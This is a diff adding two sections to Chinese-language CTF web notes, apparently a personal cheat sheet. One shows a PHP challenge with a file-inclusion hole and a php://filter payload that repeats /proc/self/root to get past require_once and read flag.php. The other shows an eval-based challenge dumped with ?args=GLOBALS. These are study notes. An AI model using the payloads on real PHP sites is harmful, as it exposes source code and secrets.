@@ -5144,6 +5144,60 @@ $pos=strpos($str_long1,$string[$i]);
 
 **有点很奇怪的是，我用PHP8和PHP5跑出来的结果并不一样，且只有PHP5的结果能爆破出种子**
 
+## `require_once` 绕过
+
+由于在代码的第三行已经使用了`require_once`包含了`flag.php`，那么在第五行的时候再次尝试包含`flag.php`就会失败
+
+```php
+<?php
+highlight_file(__FILE__);
+require_once 'flag.php';
+if(isset($_GET['file'])) {
+  require_once $_GET['file'];
+}
+```
+
+这里直接给出payload：
+
+`/proc/self/root`：指向当前进程的根路径
+
+```
+file=php://filter/read=convert.base64-encode/resource=file:///proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/flag.php
+```
+
+具体是为什么可以参考：https://www.anquanke.com/post/id/213235#h3-3
+
+## `$GLOBALS` 超全局变量
+
+`$GLOBALS`：获取全局作用域中可用的全部变量
+
+```php
+<meta charset="UTF-8" />
+<?php  
+
+error_reporting(0);
+include "flag1.php";
+highlight_file(__file__);
+if(isset($_GET['args'])){
+    $args = $_GET['args'];
+    if(!preg_match("/^\w+$/",$args)){
+        die("args error!");
+    }
+    eval("var_dump($$args);");
+}
+```
+
+payload:
+
+```
+?args=GLOBALS
+
+$args = GLOBALS
+$$args = $GLOBALS
+```
+
+
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
